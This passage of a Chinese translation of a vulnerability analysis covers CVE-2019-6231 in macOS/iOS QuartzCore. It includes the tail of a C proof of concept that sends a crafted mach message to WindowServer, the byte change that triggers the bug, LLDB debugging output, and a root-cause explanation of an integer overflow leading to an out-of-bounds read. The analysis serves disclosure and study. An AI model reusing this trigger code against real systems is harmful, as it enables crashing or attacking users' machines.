        mach_port_t context_port = *(uint32_t *)((uint8_t *)&msg_register + 0x1c);
        uint32_t conn_id = *(uint32_t *)((uint8_t *)&msg_register + 0x30);
        printf("[*] context_port: 0x%x, conn_id: 0x%x\n",context_port,conn_id);
        char *crash_log = "crash.data"; //size is 736.
        FILE *fp = fopen(crash_log, "rb");
        if(fp == NULL){
            printf("fopen error!\n");
        }
        uint64_t fsize = get_filesize(crash_log);
        void *msg_buf = malloc(fsize);
        memset(msg_buf, 0, fsize);
        fread(msg_buf, fsize, 1, fp);
        quartzcore_mach_msg_t qc_mach_msg = {0};
        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
        qc_mach_msg.header.msgh_remote_port = context_port;
        qc_mach_msg.header.msgh_id = 40002;
        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));
        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count
        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);
        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;
        kr = mach_msg(&qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            printf("[-] Send message failed: 0x%d\n", kr);
            return -1 ;
        }
        return 0;
    }
初始的mach消息和精心制作的mach消息之间的比较如下所示。
通过二进制diff工具，我们只需要将偏移量`0x142`处的一个字节从0x00修改为0x80，以触发此漏洞。
如PoC的C代码所示，为了发送精心设计的mach消息以触发，我们首先需要发送带有`msgh_id
40202`的`mach消息（`服务器中相应的处理程序是`_XRegisterClient`）以检索每个新的连接ID 连接客户端。
一旦我们获得了连接id的值，我们就将这个值设置为mach消息中的相应偏移量（0x2C）。 最后，我们发送此消息以触发漏洞。
### 原因分析
在本节中，我将使用`LLDB`来动态调试此漏洞并找出其根本原因。 请注意，我们在这里需要通过`SSH模式`调试`WindowServer`进程。
使用崩溃日志中崩溃线程的堆栈回溯操作，我们可以使用以下命令在函数`CA::Render::Server::ReceivedMessage::run_command_stream`中设置条件断点。
    br s -n CA::Render::Server::ReceivedMessage::run_command_stream
    br mod  -c '*(int*)($r13+0x2c) == [conn_id]'
`conn_id`的值可以通过在PoC的C代码中的第112行设置断点来获得。
在此断点被击中后，我们可以读取已发送的消息缓冲区中的数据。 寄存器r13指向系统消息。
    (lldb) c
    Process 172 resuming
    Process 172 stopped
    * thread #3, name = 'com.apple.coreanimation.render-server', stop reason = breakpoint 1.1
        frame #0: 0x00007fff3fca6824 QuartzCore`CA::Render::Server::ReceivedMessage::run_command_stream()
    QuartzCore`CA::Render::Server::ReceivedMessage::run_command_stream:
    ->  0x7fff3fca6824 : pushq  %rbp
        0x7fff3fca6825 : movq   %rsp, %rbp
        0x7fff3fca6828 : pushq  %r15
        0x7fff3fca682a : pushq  %r14
    Target 0: (WindowServer) stopped.
    (lldb) re read
    General Purpose Registers:
           rax = 0x0000000000000000
           rbx = 0x0000000000009c42
           rcx = 0x0000000000000002
           rdx = 0x000000000000c203
           rdi = 0x000070000cc52ca0
           rsi = 0x000000000000c203
           rbp = 0x000070000cc52ef0
           rsp = 0x000070000cc51c78
            r8 = 0x000000000001450b
            r9 = 0x0000000000000000
           r10 = 0x0000000000001000
           r11 = 0x0000000000000202
           r12 = 0x0000000000000000
           r13 = 0x000070000cc51ca0
           r14 = 0x00007fff8ece4b20  QuartzCore`CA::Render::Server::_callback_lock
           r15 = 0x00007fd93f2f5300
           rip = 0x00007fff3fca6824  QuartzCore`CA::Render::Server::ReceivedMessage::run_command_stream()
        rflags = 0x0000000000000293
            cs = 0x000000000000002b
            fs = 0x0000000000000000
            gs = 0x0000000000000000
    (lldb) x -c 0x2e0 0x000070000cc51ca0
    0x70000cc51ca0: 00 11 00 80 e0 02 00 00 00 00 00 00 2f d5 12 00  ....?......./?..
    0x70000cc51cb0: 00 00 00 00 42 9c 00 00 01 00 00 00 00 00 00 00  ....B...........
    0x70000cc51cc0: 00 00 00 00 00 00 00 00 01 00 00 00 97 9b 35 60  ..............5`
    0x70000cc51cd0: 3b fe 27 59 18 ae 77 40 01 f0 9b 00 06 7f 7f 00  ;?'Y.?w@.?......
    0x70000cc51ce0: 00 c3 01 00 00 01 30 97 00 06 7f 7f 00 00 c4 01  .?....0.......?.
    0x70000cc51cf0: 00 00 02 40 be 30 06 7f 7f 00 00 a5 01 00 00 1c  ...@?0.....?....
    0x70000cc51d00: 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51d10: 00 00 ff 00 01 01 c9 e7 03 2c d0 01 04 00 00 00  ..?...??.,?.....
    0x70000cc51d20: 00 f0 00 00 00 00 00 68 84 40 00 00 00 00 00 20  .?.....h.@.....
    0x70000cc51d30: 7c 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |@..............
    0x70000cc51d40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51d50: 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 20  ...............
    0x70000cc51d60: 00 02 f0 bb 30 06 7f 7f 00 00 a6 01 00 00 1c 02  ..?0.....?.....
    0x70000cc51d70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51d80: 00 ff 00 02 01 c9 e7 03 2c d0 01 04 00 00 00 00  .?...??.,?......
    0x70000cc51d90: f0 00 00 00 00 00 40 46 40 00 00 00 00 00 00 22  ?.....@F@......"
    0x70000cc51da0: 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  @...............
    0x70000cc51db0: 00 00 00 00 00 00 40 56 40 00 00 00 00 00 00 32  ......@V@......2
    0x70000cc51dc0: 40 fe 60 9d 21 06 7f 7f 00 00 c5 01 00 00 16 00  @?`.!.....?.....
    0x70000cc51dd0: 14 01 01 b2 00 00 00 24 00 00 00 00 03 00 00 00  ...?...$........
    0x70000cc51de0: 00 00 80 01 fe e0 1d 20 06 7f 7f 00 00 c6 01 00  ....??. .....?..
    0x70000cc51df0: 00 2d 39 00 00 6d 00 00 00 00 00 00 00 00 00 00  .-9..m..........
    0x70000cc51e00: 00 00 00 00 03 00 00 80 3f 00 00 00 00 00 00 00  ........?.......
    0x70000cc51e10: 00 00 00 80 3f 00 00 80 3f 00 00 80 3f 00 00 80  ....?...?...?...
    0x70000cc51e20: 3f 00 00 00 00 00 00 00 00 00 00 19 00 20 00 02  ?............ ..
    0x70000cc51e30: c0 ba 30 06 7f 7f 00 00 a9 01 00 00 1c 02 00 00  ??0.....?.......
    0x70000cc51e40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff  ...............?
    0x70000cc51e50: 00 01 01 c9 e7 03 2c d0 01 04 00 00 00 00 f0 00  ...??.,?......?.
    0x70000cc51e60: 00 00 00 00 64 84 40 00 00 00 00 00 10 77 40 00  ....d.@......w@.
    0x70000cc51e70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51e80: 00 00 00 00 40 56 40 00 00 00 00 00 00 32 40 00  ....@V@......2@.
    0x70000cc51e90: 00 00 00 00 00 00 00 00 00 00 18 00 20 00 02 80  ............ ...
    0x70000cc51ea0: b4 30 06 7f 7f 00 00 bf 01 00 00 1c 02 00 00 00  ?0.....?........
    0x70000cc51eb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ff 00  ..............?.
    0x70000cc51ec0: 01 01 c9 e7 03 2c d0 01 04 00 00 00 00 f0 00 00  ..??.,?......?..
    0x70000cc51ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51f00: 00 00 00 00 00 00 00 00 00 00 00 20 00 02 90 b1  ........... ...?
    0x70000cc51f10: 11 06 7f 7f 00 00 c0 01 00 00 1c 02 00 00 00 00  ......?.........
    0x70000cc51f20: 00 00 00 00 00 00 00 00 00 00 00 00 00 ff 00 01  .............?..
    0x70000cc51f30: 01 c9 e7 03 2c d0 01 04 00 00 00 00 f0 00 00 00  .??.,?......?...
    0x70000cc51f40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51f50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51f60: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
    0x70000cc51f70: 00 00 00 00 00 00 00 00 00 00 20 00 00 00 00 00  .......... .....
    (lldb)
函数`CA::Render::Decoder::decode_object(CA::Render::Decoder *this,
CA::Render::Decoder *a2)`用于解码所有类型的对象数据。
从偏移量`0x70000cc51d6e`开始的缓冲区数据是一个Layer对象（标记为绿色）。
以下代码分支用于解析Layer对象数据。
我们来看看如何处理这个Layer对象。 以下列表说明了Layer对象中字段的含义。
函数`CA::Render::Layer::Layer(CA::Render::Layer *this, CA::Render::Decoder
*a2)`的实现如下所示。
我们可以看到下一个数据仍然代表一个对象。 接下来，让我们继续跟踪下一个数据的处理方式。
下一个数据仍然代表一个对象。 此对象中的第一个字节表示对象的类型。 字节0x16表示该对象是Image对象，如下所示。
接下来，让我们看一下`CA::Render::Image::decode()`函数如何解码Image对象。
以下列表说明了Image对象中每个字段的含义。
我们可以看到数据的8个字节`（00 03 00 00 00 00 00 80）`被解码为size_t类型，并且其值被设置为异常。
在图中，变量v9等于`0x8000000000000300`，它作为参数传递给函数`CA::Render::validate_rowbytes`。
现在让我们仔细看看`CA::Render::validate_rowbytes`函数如何处理这个值。
在这里我们很容易发现算术运算`a2 * *(_QWORD *)(a3 + 8LL * v4)`是作为整数溢出而存在。
此时，变量a2等于0x24并且可以通过调用`CA::Render::Decoder::decode_int32()`来获得，如图所示。因此，由于变量v6的值等于0
而溢出。 然后该函数返回0，导致下一个程序执行流程发生变化。 通常，它应该返回1.让我们回到图中来看看执行流程的变化。
因为函数`CA::Render::validate_rowbytes`由于整数溢出而返回0，所以稍后系统可以转到`LABEL_31`处。
然后它可以调用函数`CA::Render::Texture::decode() 来解码下一个缓冲区的数据。
以下是函数`CA::Render::Texture::decode`的实现。
然后它可以调用函数`CA::Render::Decoder::decode_colorspace`来解码带有颜色的数据。
让我们完整分析一下这个功能。 它首先解码一个int8类型的整数并得到结果0x01。 然后它可以执行case 1分支。 变量v3的值等于0xFE。
然后它可以调用函数`CAGetColorSpace`来获取颜色空间的数据。
此处索引值等于0xfe，实际上这里的值大于有颜色数组的最大索引，从而能够读取受限制的内存数据。
要读取的受限存储器的地址等于`0x291EE0(0x2916F0 + 0xFE * 8)`。
因此函数`CAGetColorSpace`的返回值等于`0x8000000010`。 显然，这是一个无效的内存地址。
当此地址作为参数传递给CFRetain函数时，它可能导致`EXC_BAD_ACCESS`异常。
### 结论
我们现在已经完成了对此漏洞的详细分析。 虽然此漏洞同时影响macOS和iOS，但在本博客中，我只在macOS中进行了演示和分析。
### 受感染版本
    macOS Sierra 10.12.6，macOS High Sierra 10.13.6，macOS Mojave 10.14.2
    iPhone 5s及更高版本，iPad Air及更高版本，以及iPod touch第6代
### 参考链接
    本文翻译自https://www.fortinet.com/blog/threat-research/detailed-analysis-of-macos-ios-vulnerability-cve-2019-6231.html